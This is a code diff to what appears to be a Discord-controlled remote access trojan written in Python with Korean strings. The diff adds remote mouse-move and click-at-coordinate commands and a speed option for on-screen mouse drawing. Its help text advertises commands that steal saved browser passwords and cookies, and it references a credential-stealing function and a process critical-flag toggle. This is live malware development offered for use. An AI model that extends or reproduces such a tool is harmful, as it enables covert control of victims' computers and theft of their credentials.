@@ -782,10 +782,12 @@ def get_embed(page: str):
             "`!site <URL>` - 브라우저에서 URL 열기\n"
             "`!text <텍스트> [초]` - 화면 팝업 표시 (소수점)\n"
             "`!click [버튼] [횟수]` - 마우스 클릭 시뮬레이션\n"
+            "`!clickpos <x> <y> [버튼]` - 지정 좌표로 이동 후 클릭\n"
+            "`!move <x> <y>` - 마우스 이동만\n"
             "`!keypress <키>` - 키 입력 시뮬레이션\n"
             "`!type <텍스트>` - 텍스트 타이핑\n"
             "`!mousepos` - 현재 마우스 위치\n"
-            "`!mouseart <원/사각형/삼각형> [시간]` - 마우스로 도형 그리기 (소수점)\n"
+            "`!mouseart <원/사각형/삼각형> [시간] [속도]` - 마우스로 도형 그리기 (소수점, 속도는 초당 단계)\n"
             "`!paint <텍스트>` - 그림판 열고 텍스트 및 사각형 그리기\n"
             "`!passwords` - 브라우저 저장 비밀번호 탈취\n"
             "`!cookies` - 브라우저 쿠키 탈취 (복호화 개선됨)\n"
@@ -1064,7 +1066,8 @@ def steal_browser_passwords():
 
 # ---------- MOUSE ART & PAINT ----------
 
-def mouse_art(shape, duration=10.0):
+def mouse_art(shape, duration=10.0, speed=0.01):
+    """shape: 원, 사각형, 삼각형, duration: 초, speed: step 간격 (초)"""
     start_time = time.time()
     sw, sh = pyautogui.size()
     center_x, center_y = sw//2, sh//2
@@ -1076,7 +1079,7 @@ def mouse_art(shape, duration=10.0):
             for angle in range(0, 360, 5):
                 x = center_x + radius * math.cos(math.radians(angle))
                 y = center_y + radius * math.sin(math.radians(angle))
-                pyautogui.moveTo(x, y, duration=0.01)
+                pyautogui.moveTo(x, y, duration=speed)
                 if time.time() - start_time >= duration:
                     break
     elif shape == "사각형":
@@ -1096,7 +1099,7 @@ def mouse_art(shape, duration=10.0):
                     t = j / steps
                     x = x1 + (x2 - x1) * t
                     y = y1 + (y2 - y1) * t
-                    pyautogui.moveTo(x, y, duration=0.01)
+                    pyautogui.moveTo(x, y, duration=speed)
                     if time.time() - start_time >= duration:
                         break
                 if time.time() - start_time >= duration:
@@ -1117,7 +1120,7 @@ def mouse_art(shape, duration=10.0):
                     t = j / steps
                     x = x1 + (x2 - x1) * t
                     y = y1 + (y2 - y1) * t
-                    pyautogui.moveTo(x, y, duration=0.01)
+                    pyautogui.moveTo(x, y, duration=speed)
                     if time.time() - start_time >= duration:
                         break
                 if time.time() - start_time >= duration:
@@ -1597,6 +1600,43 @@ async def on_message(message):
             pyautogui.middleClick(clicks=count)
         await message.channel.send(embed=ch3at_embed(f"🖱️ **클릭:** {button} 버튼 {count}회"))
 
+    # ---------- !clickpos ----------
+    if message.content.startswith("!clickpos"):
+        args = message.content[10:].strip().split()
+        if len(args) < 2:
+            await message.channel.send(embed=ch3at_embed("구문: `!clickpos <x> <y> [버튼]` (버튼: left/right/middle, 기본 left)", color=0xff0000))
+        else:
+            try:
+                x = float(args[0])
+                y = float(args[1])
+                button = "left"
+                if len(args) > 2 and args[2].lower() in ["left", "right", "middle"]:
+                    button = args[2].lower()
+                pyautogui.moveTo(x, y)
+                if button == "left":
+                    pyautogui.click()
+                elif button == "right":
+                    pyautogui.rightClick()
+                elif button == "middle":
+                    pyautogui.middleClick()
+                await message.channel.send(embed=ch3at_embed(f"🖱️ **이동 및 클릭:** ({x}, {y}) {button} 버튼"))
+            except ValueError:
+                await message.channel.send(embed=ch3at_embed("좌표는 숫자여야 합니다.", color=0xff0000))
+
+    # ---------- !move ----------
+    if message.content.startswith("!move"):
+        args = message.content[6:].strip().split()
+        if len(args) < 2:
+            await message.channel.send(embed=ch3at_embed("구문: `!move <x> <y>`", color=0xff0000))
+        else:
+            try:
+                x = float(args[0])
+                y = float(args[1])
+                pyautogui.moveTo(x, y)
+                await message.channel.send(embed=ch3at_embed(f"🖱️ **마우스 이동:** ({x}, {y})"))
+            except ValueError:
+                await message.channel.send(embed=ch3at_embed("좌표는 숫자여야 합니다.", color=0xff0000))
+
     # ---------- !keypress ----------
     if message.content.startswith("!keypress "):
         key = message.content[10:].strip()
@@ -1640,21 +1680,30 @@ async def on_message(message):
     if message.content.startswith("!mouseart"):
         args = message.content[10:].strip().split()
         if len(args) == 0:
-            await message.channel.send(embed=ch3at_embed("구문: `!mouseart <원/사각형/삼각형> [시간(초)]`", color=0xff0000))
+            await message.channel.send(embed=ch3at_embed("구문: `!mouseart <원/사각형/삼각형> [시간(초)] [속도(초당 단계)]`", color=0xff0000))
         else:
             shape = args[0]
             duration = 10.0
+            speed = 0.01
             if len(args) > 1:
                 try:
                     duration = float(args[1])
                     if duration < 0: duration = 0.1
-                except:
-                    pass
+                    if len(args) > 2:
+                        speed = float(args[2])
+                        if speed < 0.001: speed = 0.001
+                except ValueError:
+                    # speed given as second arg
+                    try:
+                        speed = float(args[1])
+                        if speed < 0.001: speed = 0.001
+                    except:
+                        pass
             if shape not in ["원", "사각형", "삼각형"]:
                 await message.channel.send(embed=ch3at_embed("지원하는 도형: 원, 사각형, 삼각형", color=0xff0000))
             else:
-                await message.channel.send(embed=ch3at_embed(f"🎨 **마우스 아트:** {shape} - {duration}초"))
-                threading.Thread(target=mouse_art, args=(shape, duration), daemon=True).start()
+                await message.channel.send(embed=ch3at_embed(f"🎨 **마우스 아트:** {shape} - {duration}초, 속도 {speed}초/스텝"))
+                threading.Thread(target=mouse_art, args=(shape, duration, speed), daemon=True).start()
 
     # ---------- !paint ----------
     if message.content.startswith("!paint"):
@@ -2242,8 +2291,6 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("✅ **시스템:** 프로세스에서 중요 플래그 제거됨."))
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
-
-    # ---------- !rickroll 제거됨 ----------
 
     if message.content.startswith("!beep"):
         try:
